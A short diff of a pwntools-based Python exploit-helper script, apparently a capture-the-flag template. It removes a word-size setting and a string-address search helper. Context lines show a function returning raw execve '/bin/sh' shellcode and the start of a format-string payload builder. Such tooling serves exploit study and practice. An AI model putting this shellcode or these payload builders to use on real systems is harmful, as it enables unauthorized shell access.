@@ -17,7 +17,6 @@ context.arch = 'amd64'
 #context.arch = 'aarch64'
 context.os = 'linux'
 context.endian = 'little'
-context.word_size = 32
 # ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
 context.log_level = 'INFO'
 
@@ -55,13 +54,6 @@ def sc(arch=context.arch):
         return "\x06\x00\x00\x14\xe0\x03\x1e\xaa\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xa8\x1b\x80\xd2\x21\x00\x00\xd4\xfb\xff\xff\x97\x2f\x62\x69\x6e\x2f\x73\x68"
     else:
         return None
-
-def str_addr(s, f): # search string address in file
-    result = list(f.search(s+"\x00"))
-    if not len(result): # no result
-        return None
-    else:
-        return result[0]
 
 def fmtstr(payload, prints, index, data, byte=1):
     """
